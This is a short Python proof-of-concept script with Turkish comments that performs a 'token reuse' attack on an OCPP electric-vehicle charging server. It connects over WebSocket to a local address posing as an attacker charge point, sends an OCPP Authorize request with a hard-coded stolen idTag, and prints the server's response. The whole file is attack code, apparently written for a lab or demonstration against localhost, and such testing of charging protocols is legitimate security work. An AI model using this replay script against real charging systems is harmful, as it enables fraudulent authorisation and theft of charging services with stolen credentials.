import asyncio
import websockets
import json

# Saldırganın adresi ve çalınan token
ATTACK_URL = 'ws://127.0.0.1:9000/AttackerCP_999' # Saldırgan istasyonun adresi
ATTACK_TOKEN = '8888777766665555' 

async def attack():
    print("Saldırgan sunucuya bağlanıyor...")
    try:
        async with websockets.connect(ATTACK_URL) as websocket:
            print(f"Bağlantı başarılı: {ATTACK_URL}")

            # Token Reuse Saldırısı: Authorize mesajı gönderme
            attack_message = [
                2, # Tip: Call (Istek)
                "ATK_ID_456", # Mesaj ID
                "Authorize", # OCPP Komutu
                {"idTag": ATTACK_TOKEN} # Payload (Token)
            ]

            await websocket.send(json.dumps(attack_message))
            print(f"Çalınan Token ({ATTACK_TOKEN}) ile Authorize isteği GÖNDERİLDİ.")

            # Sunucudan cevabı bekleyelim
            response = await websocket.recv()
            print(f"Sunucu Yanıtı: {response}")

    except ConnectionRefusedError:
         print("\nHATA: Sunucu kapalı veya belirtilen portta dinlemiyor.")
    except Exception as e:
         print(f"Beklenmeyen Hata: {e}")

if __name__ == '__main__':
    asyncio.run(attack())